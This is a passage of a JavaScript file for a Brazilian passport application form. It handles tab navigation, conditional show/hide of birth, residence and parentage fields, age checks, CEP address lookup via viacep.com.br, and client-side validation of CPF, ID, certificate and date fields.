/*************************************************
SCRIPTS DAS PAGINAS RELATIVAS A SOLICITACAO
**************************************************/

/*************************************************
NOVA SOLICITAO
**************************************************/
/**
 * Funcoes de layout da tela.
 */
$(function() {
	
	$tab = null;
	$tab1 = $('#myTab a[href="#painelUm"]');
	$tab2 = $('#myTab a[href="#painelDois"]');
	$tab3 = $('#myTab a[href="#painelTres"]');
	$tab4 = $('#myTab a[href="#painelQuatro"]');
	
	/**
	 * Navegacao por abas e botoes de navegacaoo.
	 */
	$tab1.tab('show');
	
	$('#anterior1').click(function() {
		$tab1.tab('show');
		$("#iniciopainelum").focus();
	});
	$('#proximo1, #anterior2').click(function() {
		$tab2.tab('show');
		$("#iniciopaineldois").focus();
	});
	$('#proximo2, #anterior3').click(function() {
		$tab3.tab('show');
		$("#iniciopaineltres").focus();
	});
	$('#proximo3').click(function() {
		$tab4.tab('show');
		$("#iniciopainelquatro").focus();
	});
	
	
	/**
	 * Esconder o carregamento de endereco
	 */
	$("#aguarde").hide();
	
	/**
	 * Popover (help).
	 */
	$('[data-toggle="nomes"]').popover();
	$('[data-toggle="documentos"]').popover();
	$('[data-toggle="certidao"]').popover();
	$('[data-toggle="titulo"]').popover();
	$('[data-toggle="anterior"]').popover();
	$('[data-toggle="autorizacao"]').popover();
	$('[data-toggle="atendimento"]').popover();
	
	/**
	 * Habilitar/desabilitar botao enviar.
	 */
	habilitarEnviar();
	$('#checkConfirmo').click(habilitarEnviar());
	
	atualizarDadosRevisao();
	
});

/**
 * Declaracao de constantes.
 */
var CODIGO_BRASIL = 3034;
var CODIGO_OUTRA_CIDADE = "0";
var CODIGO_OUTRA_PROFISSAO = 0;
var MAIORIDADE_CIVIL = 18;


//Funcoes para atualizar valores para aba de revisao
$("#nomeCompleto").on('keyup keypress blur change', function() {
	$('#nomeInformado').text($('#nomeCompleto').val().toUpperCase());
});

$("#nomeFiliacao1").on('keyup keypress blur change', function() {
	$('#filiacao1Informado').text($('#nomeFiliacao1').val().toUpperCase());
});

$("#nomeFiliacao2").on('keyup keypress blur change', function() {
	$('#filiacao2Informado').text($('#nomeFiliacao2').val().toUpperCase());
});

$("#dataNascimento").on('keyup keypress blur change', function() {
	$('#dataNascimentoInformado').text($('#dataNascimento').val());
});

$("#sexo").on('keyup keypress blur change', function() {
	$('#sexoInformado').text($('#sexo option:selected').text().toUpperCase());
});

$("#paisNacionalidade").on('keyup keypress blur change', function() {
	$('#nacionalidadeInformado').text($('#paisNacionalidade option:selected').text());
});

$("#cidadeNascimento, #nomeCidadeNascimento, #cidadeNascimentoEstrangeiro").on(
	'keyup keypress blur change', function(event) {
	montarNaturalidade();
});


function montarNaturalidade() {
	var naturalidade = "";
	if ($("#paisNascimento").val() == CODIGO_BRASIL) {
		if ($("#cidadeNascimento option:selected").val() != "0") {
			naturalidade = $('#cidadeNascimento option:selected').text() + "/" + $('#ufNascimento option:selected').text();
		} else {
			naturalidade = $('#nomeCidadeNascimento').val().toUpperCase() + "/" + $('#ufNascimento option:selected').text();		
		}
	} else {
		naturalidade = $("#cidadeNascimentoEstrangeiro").val().toUpperCase();
	}
	$('#naturalidadeInformado').text(naturalidade);
	$('#nacionalidadeInformado').text($('#paisNacionalidade option:selected').text());
}


function habilitarEnviar() {
	$("#btnEnviar").prop("disabled", !$('#checkConfirmo').is(":checked"));
}

/**
 * Habilitar/desabilitar campos de nascimento de acordo com o pais selecionado.
 */
function atualizarCamposNascimento(isPaginaCarregada) {
	if ($("#paisNascimento").val() == CODIGO_BRASIL) {
		$("#ufNascimento").prop("disabled", false);
		$("#cidadeNascimento").prop("disabled", false);
		$("#cidadeNascimentoEstrangeiro").val("");
		$("#linhaCidadeNascimentoEstrangeiro").hide();
		if ($("#cidadeNascimento").val() === CODIGO_OUTRA_CIDADE) {
			$("#linhaNomeCidadeNascimento").show();
		} else {
			$("#nomeCidadeNascimento").val("");
			$("#linhaNomeCidadeNascimento").hide();
		}
		
	} else if ($("#paisNascimento").val() != "") {
		$("#ufNascimento").val("");
		$("#cidadeNascimento").empty().append('<option selected="selected" value=""></option>');
		$("#cidadeNascimento").val("");
		$("#ufNascimento").prop("disabled", true);
		$("#cidadeNascimento").prop("disabled", true);
		$("#nomeCidadeNascimento").val("");
		$("#linhaNomeCidadeNascimento").hide();
		$("#linhaCidadeNascimentoEstrangeiro").show();
		
	} else {
		$("#ufNascimento").val("");
		$("#cidadeNascimento").empty().append('<option selected="selected" value=""></option>');
		$("#cidadeNascimento").val("");
		$("#ufNascimento").prop("disabled", true);
		$("#cidadeNascimento").prop("disabled", true);
		$("#nomeCidadeNascimento").val("");
		$("#linhaNomeCidadeNascimento").hide();
		$("#cidadeNascimentoEstrangeiro").val("");
		$("#linhaCidadeNascimentoEstrangeiro").hide();
	}
}

/**
 * Habilitar/desabilitar campos de residencia de acordo com o pais selecionado.
 */
function atualizarCamposResidencia(isPaginaCarregada) {
	if ($("#paisResidencia").val() == CODIGO_BRASIL) {
		$("#ufResidencia").prop("disabled", false);
		$("#cidadeResidencia").prop("disabled", false);
		$("#cidadeResidenciaEstrangeiro").val("");
		$("#linhaCidadeResidenciaEstrangeiro").hide();
		$(".obrigatorioResidencia").show();
		$(".obrigatorioResidenciaCampo").attr('aria-required', true);
		if (isPaginaCarregada == false) {
		}
	} else if ($("#paisResidencia").val() != "") {
		$("#ufResidencia").val("");
		$("#cidadeResidencia").empty().append('<option selected="selected" value=""></option>');
		$("#cidadeResidencia").val("");
		$("#ufResidencia").prop("disabled", true);
		$("#cidadeResidencia").prop("disabled", true);
		$("#linhaCidadeResidenciaEstrangeiro").show();
		$(".obrigatorioResidencia").hide();
		$(".obrigatorioResidenciaCampo").attr('aria-required', false);
	} else {
		$("#ufResidencia").val("");
		$("#cidadeResidencia").empty().append('<option selected="selected" value=""></option>');
		$("#cidadeResidencia").val("");
		$("#ufResidencia").prop("disabled", true);
		$("#cidadeResidencia").prop("disabled", true);
		$("#linhaCidadeResidenciaEstrangeiro").hide();
		$(".obrigatorioResidencia").hide();
		$(".obrigatorioResidenciaCampo").attr('aria-required', false);
	}
}

/**
 * Habilitar/desabilitar campos de autorizacao de viagem.
 */
function atualizarAutorizacaoViagem() {
	if (($("#paisNacionalidade").val() == CODIGO_BRASIL) && !isMaiorQueIdade(MAIORIDADE_CIVIL) && !isEmancipado()) {
		$("#linhaAutorizacaoViagem").show();
	} else {
		$("#autorizacaoViagem1").prop('checked', false);
		$("#autorizacaoViagem2").prop('checked', false);
		$("#autorizacaoViagem3").prop('checked', false);
		$("#autorizacaoViagem1").val("");
		$("#autorizacaoViagem2").val("");
		$("#autorizacaoViagem3").val("");
		$("#autorizacaoViagem").val("");
		$("#linhaAutorizacaoViagem").hide();
	}
}

/**
 * Exibir campos de autorizacao de viagem.
 */
function exibirAutorizacaoViagem() {
	if (($("#paisNacionalidade").val() == CODIGO_BRASIL) && !isMaiorQueIdade(MAIORIDADE_CIVIL) && !isEmancipado()) {
		$("#linhaAutorizacaoViagem").show();
	} else {
		$("#linhaAutorizacaoViagem").hide();
	}
}



function atualizarAlteracaoNome() {
	if ($('#docViagemPosse').val() > 1 ) {
		$("#linhaAlteracaoNome").show();
		
	} else {
		$("#linhaAlteracaoNome").hide();
		$("#alteracaoNome1").prop('checked', false);
		$("#alteracaoNome2").prop('checked', false);
	}
}

/**
 * Habilitar/desabilitar campos de nacionalidade do filiacao 1.
 */
function atualizarNacionalidadePaisFiliacao1() {
	
	if (!isMaiorQueIdade(MAIORIDADE_CIVIL)) {
		if ($('#nomeFiliacao1').val() != '') {
			$('#paisNacionalidadeFiliacao1').val(CODIGO_BRASIL);
			$('#linhaNacionalidadeFiliacao1').show();
		} else {
			$('#paisNacionalidadeFiliacao1').val(CODIGO_BRASIL);
			$('#linhaNacionalidadeFiliacao1').hide();
		}
	} else {
		$('#paisNacionalidadeFiliacao1').val(CODIGO_BRASIL);
		$('#linhaNacionalidadeFiliacao1').hide();
	}
}

/**
 * Habilitar/desabilitar campos de nacionalidade do filiacao 2.
 */
function atualizarNacionalidadePaisFiliacao2() {
	if (!isMaiorQueIdade(MAIORIDADE_CIVIL)) {
		if ($('#nomeFiliacao2').val() != '') {
			$('#paisNacionalidadeFiliacao2').val(CODIGO_BRASIL);
			$('#linhaNacionalidadeFiliacao2').show();
		} else {
			$('#paisNacionalidadeFiliacao2').val(CODIGO_BRASIL);
			$('#linhaNacionalidadeFiliacao2').hide();
		}
	} else {
		$('#paisNacionalidadeFiliacao2').val(CODIGO_BRASIL);
		$('#linhaNacionalidadeFiliacao2').hide();
	}
}

/**
 * Habilitar/desabilitar campos de certidao de nascimento de acordo com o tipo de certidao.
 */
function  habilitaDesabilitaCamposCertidao(){
	if (isCertidaoModeloNovo()) {
		$("#certidaoMatricula").prop("disabled", false);
		$('#certidaoMatricula').focus();
		$("#certidaoTipo").prop("disabled", true);
		$("#certidaoTipo").val("");
		$("#certidaoLivro").prop("disabled", true);
		$("#certidaoLivro").val("");
		$("#certidaoNumero").prop("disabled", true);
		$("#certidaoNumero").val("");		
		$("#certidaoFolha").prop("disabled", true);
		$("#certidaoFolha").val("");
	} else {
		$("#certidaoTipo").prop("disabled", false);
		$("#certidaoLivro").prop("disabled", false);
		$("#certidaoNumero").prop("disabled", false);
		$("#certidaoFolha").prop("disabled", false);
		$("#certidaoMatricula").prop("disabled", true);
		$("#certidaoMatricula").val("");
	}
}

/**
 * Checar se e emancipado.
 * @returns {Boolean}
 */
function isEmancipado() {
	return $('#checkEmancipado').is(":checked");
}

/**
 * Checar se e Adoção Internacional.
 * @returns {Boolean}
 */
function isAdocaoInternacional() {
	return $('#checkAdocaoInternacional').is(":checked");
}

/**
 * Testa se e menor de idade e emancipado.
 * @returns {Boolean}
 */
function isMenorDeIdadeEEmancipado() {
	return !isMaiorQueIdade(MAIORIDADE_CIVIL) && isEmancipado();
}

/**
 * Checa se o tipo de certidao e do modelo novo.
 * @returns {Boolean}
 */
function isCertidaoModeloNovo() {
	return $('#checkNovaCertidao').is(":checked");
}

/**
 * Checa se e maior que uma determinada idade.
 * @returns {Boolean}
 */
function isMaiorQueIdade(idade) {
	
	if ($('#dataNascimento').val() != "") {
		var arrayDataNascimento = $('#dataNascimento').val().split("/");
		var dia = parseInt(stripZeros(arrayDataNascimento[0]));
		var mes = parseInt(stripZeros(arrayDataNascimento[1]));
		var ano = parseInt(stripZeros(arrayDataNascimento[2]));
		var dataNascimento = new Date();
		dataNascimento.setFullYear(ano, mes-1, dia);
		
		var hoje = new Date();
	    var diaQueCompletaIdade = new Date();                   
	    diaQueCompletaIdade.setFullYear(dataNascimento.getFullYear() + idade, mes-1, dia);
		
	    if ((hoje - diaQueCompletaIdade) >= 0){
	    	return true;
	    }else{
	    	return false;
	    }
	} else {
		return true;
	}
}

/**
 * Habilitar/desabilitar campos de outras profissoes.
 */
function selecionouProfissao() {
	if ($('#profissao').val() != null && $('#profissao').val() != "" && $('#profissao').val() == CODIGO_OUTRA_PROFISSAO) {
		$('#linhaNomeProfissao').show();
	} else {
		$('#nomeProfissao').val("");
		$('#linhaNomeProfissao').hide();
	}
}

cidadeSelecionada = "";

/**
 * Habilitar/desabilitar campos de outra cidade.
 * @param cidade
 * @param linhaOutraCidade
 * @param nomeOutraCidade
 */
function selecionouCidade(cidade, linhaOutraCidade, nomeOutraCidade) {
	if (cidade.val() === String(CODIGO_OUTRA_CIDADE)){
		linhaOutraCidade.show();
		if (cidade.val() != cidadeSelecionada){
			nomeOutraCidade.focus();
		}
	} else if (cidade.val() > CODIGO_OUTRA_CIDADE) {
		nomeOutraCidade.val("");
		linhaOutraCidade.hide();
	}
}

function guardaValorCidade(cidade){
	cidadeSelecionada = cidade.val();
}

/**
 * Habilitar/desabilitar campos emancipado.
 */
function habilitarDesabilitarEmancipado() {
	if (isMaiorQueIdade(MAIORIDADE_CIVIL)) {
		$("#checkEmancipado").prop('checked', false);
		$("#checkEmancipado").prop("disabled", true);
		$("#checkEmancipado").attr('aria-disabled', true);
		$("#checkAdocaoInternacional").prop('checked', false);
		$("#checkAdocaoInternacional").prop("disabled", true);
		$("#checkAdocaoInternacional").attr('aria-disabled', true);
	} else {
		$("#checkEmancipado").prop("disabled", false);
		$("#checkEmancipado").attr('aria-disabled', false);
		$("#checkAdocaoInternacional").prop("disabled", false);
		$("#checkAdocaoInternacional").attr('aria-disabled', false);
		$("#checkEmancipado").focus();
	}
}

/**
 * Habilitar/desabilitar campos de passaporte de acordo com a posse.
 * @param $tipoPosseEmPoderRequerente
 */
function selecionouTipoPosse($tipoPosseEmPoderRequerente, $tipoPassaporteAnteriorVencido, $tipoPosseNaoPossui) {
	if ($('#docViagemPosse').val() != $tipoPosseEmPoderRequerente
			 && $('#docViagemPosse').val() != $tipoPassaporteAnteriorVencido) {
		$('#docViagemAnteriorSerie').prop("disabled", true);
		$('#docViagemAnteriorNumero').prop("disabled", true);
		$("#docViagemAnteriorSerie").val("");
		$("#docViagemAnteriorNumero").val("");
	} else {
		$('#docViagemAnteriorSerie').prop("disabled", false);
		$('#docViagemAnteriorNumero').prop("disabled", false);
	}
	
	if ($('#docViagemPosse').val() != $tipoPosseNaoPossui && $('#docViagemPosse').val() != null) {
		$("#linhaAlteracaoNome").show();
		
	} else {
		$("#linhaAlteracaoNome").hide();
		$("#alteracaoNome1").prop('checked', false);
		$("#alteracaoNome2").prop('checked', false);
	}
	
}

/**
 * Setar dispatch para redirecionar para outra funcionalidade.
 * @param acao
 * @param validar
 * @param hiddenDispatch
 * @param hiddenValidar
 */
function setDispatch(acao, validar, hiddenDispatch, hiddenValidar) {
	hiddenDispatch.value = acao;
	hiddenValidar.value = validar;
}

/**
 *  Adicionar nome anterior na tabela de nomes anteriores.
 */
function adicionarNomeAnterior($form) {
	if (!isCampoEmBranco($("#selNomesAnterioresMotivo")) 
			&& !isCampoEmBranco($("#nomesAnterioresNome"))) {
		setDispatch('adicionarNomeAnterior', 'false', $('#dispatch')[0], $('#validate')[0]);
		$("#ancoraNomesAnteriores").focus();
		$form.submit();
		
	} else {
		mensagem = "";
		destacarCampoPreenchimentoObrigatorio($("#nomesAnterioresNome"), "Nome anterior");
		destacarCampoPreenchimentoObrigatorio($("#selNomesAnterioresMotivo"), "Motivo da mudan\u00E7a");
		irParaAncora("ancoraNomesAnteriores");
		return exibirMensagemErroLocal("Os campos obrigat\u00F3rios a seguir necessitam ser preenchidos:", mensagem, "erroNomeAnterior");
	}
}

/**
 * Busca o endereço do requerente baseado no cep informado.
 * @param $form
 */
function buscarEndereco($form) {
	var cepField = document.getElementById('cep');
	var cep = cepField.value.replace(/\D/g, '');
	
	if (cep.length !== 8) {
		return;
	}
	
	document.getElementById('aguarde').style.display = '';
	
	fetch('https://viacep.com.br/ws/' + cep + '/json/')
		.then(function(response) {
			return response.json();
		})
		.then(function(data) {
			document.getElementById('aguarde').style.display = 'none';
			
			if (data.erro) {
				alert('CEP nao encontrado.');
				return;
			}
			
			// Preencher campos de endereco
			if (data.logradouro) {
				document.getElementById('enderecoResidencia').value = data.logradouro;
			}
			if (data.bairro) {
				document.getElementById('bairro').value = data.bairro;
			}
			if (data.localidade) {
				document.getElementById('cidadeResidencia').value = data.localidade;
			}
			if (data.uf) {
				document.getElementById('ufResidencia').value = data.uf;
			}
			
			// Focar no campo logradouro para usuario continuar preenchendo
			document.getElementById('enderecoResidencia').focus();
		})
		.catch(function(error) {
			document.getElementById('aguarde').style.display = 'none';
			console.log('Erro ao buscar CEP:', error);
		});
}

/**
 * Mudar para aba de Dados complementares ao carregar o endereco
 * @param carregouEndereco
 */
function atualizarEndereco(carregouEndereco) {
	if (carregouEndereco == "true") {
		$tab3.tab('show');
		$("#ufResidencia").focus();
		atualizarDadosRevisao();
	}
}

/**
 * Atualiza os dados a serem exibidos na aba de revisao
 */
function atualizarDadosRevisao() {
	//Atualizar os campos de Revisar Dados
	var nomeInformado = document.getElementById('nomeInformado');
	nomeInformado.textContent = document.getElementById('nomeCompleto').value.toUpperCase();
	
	var filiacao1Informado = document.getElementById('filiacao1Informado');
	filiacao1Informado.textContent = document.getElementById('nomeFiliacao1').value.toUpperCase();
	
	var filiacao2Informado = document.getElementById('filiacao2Informado');
	filiacao2Informado.textContent = document.getElementById('nomeFiliacao2').value.toUpperCase();
	
	var dataNascimentoInformado = document.getElementById('dataNascimentoInformado');
	dataNascimentoInformado.textContent = document.getElementById('dataNascimento').value.toUpperCase();
	
	var sexoInformado = document.getElementById('sexoInformado');
	var sexoSelecionado = document.getElementById('sexo');
	
	sexoInformado.textContent = sexoSelecionado.options[sexoSelecionado.selectedIndex].innerText.toUpperCase(); 
	
	var nacionalidadeInformado = document.getElementById('nacionalidadeInformado');
	var pais = document.getElementById('paisNacionalidade');
	nacionalidadeInformado.textContent = pais.options[pais.selectedIndex].value.toUpperCase();

	montarNaturalidade();
}

/**
 *  Remover nome anterior na tabela de nomes anteriores.
 */
function removerNomeAnterior($form){
	var checkboxes = $('.checkremover');
	for (var i = 0; i < checkboxes.length; i++) {
		if (checkboxes[i].checked) {
			if (confirm('Confirma a remo\u00E7\u00E3o?')) {
				setDispatch('removerNomeAnterior', 'false', $('#dispatch')[0], $('#validate')[0]);
				$form.submit();
				return;
			}
		} else {
			alert("Selecione um dos nomes anteriores para remover.");
		}
	}
}

/**
 * Validacao de campos em branco
 * @returns {Boolean}
 */
function validarCamposSolicitacao() {
	mensagem = "";
	$dataAtual = new Date();
	$dataEmissao = "";
	$dataNascimento = "";
	
	destacarCampoPreenchimentoObrigatorio($("#nomeCompleto"), "Nome completo", $tab1);
	destacarCampoPreenchimentoObrigatorio($("#sexo"), "Sexo", $tab1);
	validarRegraNomeFiliacaoSexo();
	destacarCampoPreenchimentoObrigatorio($("#dataNascimento"), "Data de nascimento", $tab1);
	validarRegraDataNascimento();
	destacarCampoPreenchimentoObrigatorio($("#racaCor"), "Ra\u00E7a/cor", $tab1);
	destacarCampoSobDeterminadaCondicao(
			($("#paisNascimento").val() == CODIGO_BRASIL) && isCampoEmBranco($("#ufNascimento")), 
			$("#ufNascimento"), "UF de nascimento", $tab1);
	
	validarCidadeNascimento();
	
	destacarCampoSobDeterminadaCondicao(
			!isCampoEmBranco($("#nomesAnterioresNome")) && isCampoEmBranco($("#selNomesAnterioresMotivo")), 
			$("#selNomesAnterioresMotivo"), "Motivo da mudanca de nome anterior", $tab1);
	
	validarDocumentos();
		
	destacarCampoPreenchimentoObrigatorio($("#docViagemPosse"), "Situa\u00E7\u00E3o do Passaporte anterior", $tab2);
	destacarCampoSobDeterminadaCondicao(
			isMaiorQueIdade(17) && isCampoEmBranco($("#profissao")), 
			$("#profissao"), "Profiss\u00E3o", $tab3);
	destacarCampoPreenchimentoObrigatorio($("#enderecoEletronico"), "E-mail", $tab3);
	validarRegraEmail();

	validarNacionalidadeFiliacao();
	
	validarResidencia();
	
	validarCep();
	
	destacarCampoSobDeterminadaCondicao(isCampoEmBranco($("#ddd")) && !isCampoEmBranco($("#telefone")), 
			$("#ddd"), "DDD", $tab3);
	destacarCampoSobDeterminadaCondicao(!isCampoEmBranco($("#ddd")) && isCampoEmBranco($("#telefone")), 
			$("#telefone"), "Telefone", $tab3);
	
	validarTelefone();
	
	return exibirMensagemErro("Atente para o preenchimento dos seguintes campos:", mensagem);
}

/**
 * Verifica que informacao de cidade foi preenchida de acordo com o pais selecionado e a cidade selecionada no combo.
 */
function validarCidadeNascimento(){
	if($("#paisNascimento").val() == CODIGO_BRASIL){
		if ($("#cidadeNascimento").val() === String(CODIGO_OUTRA_CIDADE)) {
			destacarCampoSobDeterminadaCondicao(
					$("#paisNascimento").val() == CODIGO_BRASIL && isCampoEmBranco($("#nomeCidadeNascimento")), 
					$("#nomeCidadeNascimento"), "Cidade de nascimento", $tab1);	
		} else {
			destacarCampoPreenchimentoObrigatorio($("#cidadeNascimento"), "Cidade de nascimento", $tab1);
			tirarDestaqueCampo($("#nomeCidadeNascimento"));
			tirarDestaqueCampo($("#cidadeNascimentoEstrangeiro"));
		}
	} else {
		destacarCampoPreenchimentoObrigatorio($("#cidadeNascimentoEstrangeiro"), "Cidade de nascimento", $tab1);
		tirarDestaqueCampo($("#cidadeNascimento"));
		tirarDestaqueCampo($("#nomeCidadeNascimento"));
	}
}

function validarDocumentos() {
	if ($("#paisNacionalidade").val() == CODIGO_BRASIL) {
		validarPreenchimentoIdentidade();
		validarPreenchimentoCpf();
		validarPreenchimentoCertidao();
	} else {
		tirarDestaqueCamposEstrangeiro();
	}
}

/**
 * Verifica se a identidade foi preenchida se o requerente tem mais que 12 anos.
 */
function validarPreenchimentoIdentidade() {
	if (isMaiorQueIdade(12)) {
		destacarCampoPreenchimentoObrigatorio($("#identidadeNumero"), "N\u00FAmero da identidade", $tab2);
		destacarCampoPreenchimentoObrigatorio($("#identidadeDataEmissao"), "Data de emiss\u00E3o do Documento de Identidade", $tab2);
		destacarCampoPreenchimentoObrigatorio($("#identidadeOrgaoEmissor"), "\u00D3rg\u00E3o emissor do Documento de Identidade", $tab2);
		destacarCampoPreenchimentoObrigatorio($("#selIdentidadeUFExpedicao"), "UF de expedi\u00E7\u00E3o do Documento de Identidade", $tab2);
		tirarDestaqueCampo($("#certidaoMatricula"));
		tirarDestaqueCampo($("#certidaoTipo"));
		tirarDestaqueCampo($("#certidaoNumero"));
		tirarDestaqueCampo($("#certidaoLivro"));
		tirarDestaqueCampo($("#certidaoFolha"));
	}
	validarRegraDataEmissaoIdentidade();
}

function tirarDestaqueCamposEstrangeiro() {
	tirarDestaqueCampo($("#identidadeNumero"));
	tirarDestaqueCampo($("#identidadeDataEmissao"));
	tirarDestaqueCampo($("#identidadeOrgaoEmissor"));
	tirarDestaqueCampo($("#selIdentidadeUFExpedicao"));
	tirarDestaqueCampo($("#cpf"));
	tirarDestaqueCampo($("#cpfResponsavel"));
	tirarDestaqueCampo($("#certidaoMatricula"));
	tirarDestaqueCampo($("#certidaoTipo"));
	tirarDestaqueCampo($("#certidaoNumero"));
	tirarDestaqueCampo($("#certidaoLivro"));
	tirarDestaqueCampo($("#certidaoFolha"));
}

/**
 * Verifica se o cpf foi preenchido por maior de idade ou emancipado ou se o 
 * cpf ou cpf do responsavel foi preenchido para os menores de idade. 
 * Valido somente para quem tem nacionalidade brasileira.
 */
function validarPreenchimentoCpf() {
	if (!isMaiorQueIdade(MAIORIDADE_CIVIL) && !isEmancipado()) {
		if (!isAdocaoInternacional()) {
			destacarCampoPreenchimentoObrigatorio($("#cpf"), "CPF", $tab2);
			destacarCampoPreenchimentoObrigatorio($("#cpfResponsavel"), "CPF do repons\u00E1vel", $tab2);
		} else {
			destacarCampoPreenchimentoObrigatorio($("#cpfResponsavel"), "CPF do repons\u00E1vel", $tab2);
			tirarDestaqueCampo($("#cpf"));
		}
	} else {
		destacarCampoPreenchimentoObrigatorio($("#cpf"), "CPF", $tab2);
		tirarDestaqueCampo($("#cpfResponsavel"));
	}

	validarRegraCpfProprioCpfResponsavel();
}

/**
 * Verifica se os dados de certidao de nascimento foram preenchidos. Obrigatorio para
 * menores de 12 anos ou para requerentes que tiveram mudanca no nome.
 */
function validarPreenchimentoCertidao() {
	if (!isMaiorQueIdade(12)) {
		if (isCampoEmBranco($("#identidadeNumero"))) {
			if ($("#checkNovaCertidao").is(":checked")) {
				destacarCampoPreenchimentoObrigatorio($("#certidaoMatricula"), "Matr\u00EDcula da certid\u00E3o", $tab2);
				tirarDestaqueCampo($("#certidaoTipo"));
				tirarDestaqueCampo($("#certidaoNumero"));
				tirarDestaqueCampo($("#certidaoLivro"));
				tirarDestaqueCampo($("#certidaoFolha"));
			} else {
				destacarCampoSobDeterminadaCondicao($("#certidaoTipo").val() == "0", $("#certidaoTipo"), "Tipo de certid\u00E3o", $tab2);
				destacarCampoPreenchimentoObrigatorio($("#certidaoNumero"), "Numero de certid\u00E3o", $tab2);
				destacarCampoPreenchimentoObrigatorio($("#certidaoLivro"), "Livro de certid\u00E3o", $tab2);
				destacarCampoPreenchimentoObrigatorio($("#certidaoFolha"), "Folha de certid\u00E3o", $tab2);
				tirarDestaqueCampo($("#certidaoMatricula"));
			}
			destacarCampoPreenchimentoObrigatorio($("#certidaoCartorio"), "Cart\u00F3rio da certid\u00E3o", $tab2);
			destacarCampoPreenchimentoObrigatorio($("#certidaoUfExpedicao"), "UF de expedi\u00E7\u00E3o da certid\u00E3o", $tab2);
			destacarCampoPreenchimentoObrigatorio($("#certidaoCidadeExpedicao"), "Cidade de expedi\u00E7\u00E3o da certid\u00E3o", $tab2);	
			
		} else {
			destacarCampoPreenchimentoObrigatorio($("#identidadeDataEmissao"), "Data de emiss\u00E3o do Documento de Identidade", $tab2);
			destacarCampoPreenchimentoObrigatorio($("#identidadeOrgaoEmissor"), "\u00D3rg\u00E3o emissor do Documento de Identidade", $tab2);
			destacarCampoPreenchimentoObrigatorio($("#selIdentidadeUFExpedicao"), "UF de expedi\u00E7\u00E3o do Documento de Identidade", $tab2);
			tirarDestaqueCampo($("#certidaoMatricula"));
			tirarDestaqueCampo($("#certidaoTipo"));
			tirarDestaqueCampo($("#certidaoNumero"));
			tirarDestaqueCampo($("#certidaoLivro"));
			tirarDestaqueCampo($("#certidaoFolha"));
			tirarDestaqueCampo($("#certidaoCartorio"));
			tirarDestaqueCampo($("#certidaoUfExpedicao"));
			tirarDestaqueCampo($("#certidaoCidadeExpedicao"));
		}
		
		
	} else {
		tirarDestaqueCampo($("#certidaoCartorio"));
		tirarDestaqueCampo($("#certidaoUfExpedicao"));
		tirarDestaqueCampo($("#certidaoCidadeExpedicao"));
	}
}

/**
 * Verifica se e necessario preencher o nome da filiacao.
 */
function validarNacionalidadeFiliacao() {
	if (!isMaiorQueIdade(MAIORIDADE_CIVIL)) {
		if ($('#nomeFiliacao1').val() != '') {
			destacarCampoPreenchimentoObrigatorio($("#paisNacionalidadeFiliacao1"), "Nacionalidade da Filia\u00E7\u00E3o 1", $tab3);
		}
		if ($('#nomeFiliacao2').val() != '') {
			destacarCampoPreenchimentoObrigatorio($("#paisNacionalidadeFiliacao2"), "Nacionalidade da Filia\u00E7\u00E3o 2", $tab3);
		}
	}
}

/**
 * Validar campos de residencia.
 */
function validarResidencia(){
	if (!isCampoEmBranco($("#paisResidencia"))) {
		if ($("#paisResidencia").val() == CODIGO_BRASIL) {
			destacarCampoPreenchimentoObrigatorio($("#cep"), "CEP de resid\u00EAncia", $tab3);
			destacarCampoPreenchimentoObrigatorio($("#ufResidencia"), "UF de resid\u00EAncia", $tab3);
			destacarCampoPreenchimentoObrigatorio($("#cidadeResidencia"), "Cidade de resid\u00EAncia", $tab3);
			destacarCampoPreenchimentoObrigatorio($("#enderecoResidencia"), "Logradouro de resid\u00EAncia", $tab3);
			destacarCampoPreenchimentoObrigatorio($("#bairro"), "Bairro de resid\u00EAncia", $tab3);
		} else {
			tirarDestaqueCampo($("#cep"));
			tirarDestaqueCampo($("#ufResidencia"));
			tirarDestaqueCampo($("#cidadeResidencia"));
			tirarDestaqueCampo($("#enderecoResidencia"));
			tirarDestaqueCampo($("#bairro"));
		}
	}
}

/**
 * Valida a data de nascimento
 */
function validarRegraDataNascimento() {
	if (!isCampoEmBranco($('#dataNascimento')) && $('#dataNascimento').val().length < 10) {
		mensagem += "<li>- Data de Nascimento inv\u00E1lida.</li>";
		destacarCampo($("#dataNascimento"));
	} else if (!isCampoEmBranco($('#dataNascimento'))){
		$dataNascimento = parseToDate($('#dataNascimento'));
	}
	
	if ($dataNascimento != "" && $dataNascimento > $dataAtual) {
		mensagem += "<li>- Data de Nascimento posterior a Data Atual.</li>";
 		destacarCampo($("#dataNascimento"));
 	}
}

/**
 * Valida a data de nascimento
 */
function validarRegraNomeFiliacaoSexo() {
	tirarDestaqueCampo($("#nomeFiliacao1"));
	tirarDestaqueCampo($("#sexoFiliacao1"));
	tirarDestaqueCampo($("#sexoFiliacao2"));
	tirarDestaqueCampo($("#sexoFiliacao2"));
	
	if (!isCampoEmBranco($('#nomeFiliacao1')) && isCampoEmBranco($('#sexoFiliacao1'))) {
		mensagem += "<li>- Informe o sexo da filia\u00E7\u00E3o 1 ou limpe o campo nome da filia\u00E7\u00E3o 1.</li>";
		destacarCampo($("#sexoFiliacao1"));
		$tab = $tab1;
	}
	if (isCampoEmBranco($('#nomeFiliacao1')) && !isCampoEmBranco($('#sexoFiliacao1'))) {
		mensagem += "<li>- Informe o nome da filia\u00E7\u00E3o 1 ou limpe o campo sexo da filia\u00E7\u00E3o 1.</li>";
		destacarCampo($("#nomeFiliacao1"));
		$tab = $tab1;
	}
	if (!isCampoEmBranco($('#nomeFiliacao2')) && isCampoEmBranco($('#sexoFiliacao2'))) {
		mensagem += "<li>- Informe o sexo da filia\u00E7\u00E3o 2 ou limpe o campo nome da filia\u00E7\u00E3o 2.</li>";
		destacarCampo($("#sexoFiliacao2"));
		$tab = $tab1;
	}
	if (isCampoEmBranco($('#nomeFiliacao2')) && !isCampoEmBranco($('#sexoFiliacao2'))) {
		mensagem += "<li>- Informe o nome da filia\u00E7\u00E3o 2 ou limpe o campo sexo da filia\u00E7\u00E3o 2.</li>";
		destacarCampo($("#nomeFiliacao2"));
		$tab = $tab1;
	}
}

/**
 * valida o cpf e cpf do responsavel.
 */
function validarRegraCpfProprioCpfResponsavel() {
	if (!isCampoEmBranco($('#cpf')) && !valida_cpf($('#cpf').cleanVal())) {
		mensagem += "<li>- O CPF informado \u00E9 inv\u00E1lido. Por favor, informar CPF v\u00E1lido.</li>";
		destacarCampo($("#cpf"));
	}

	if (!isCampoEmBranco($('#cpfResponsavel')) && !valida_cpf($('#cpfResponsavel').cleanVal())) {
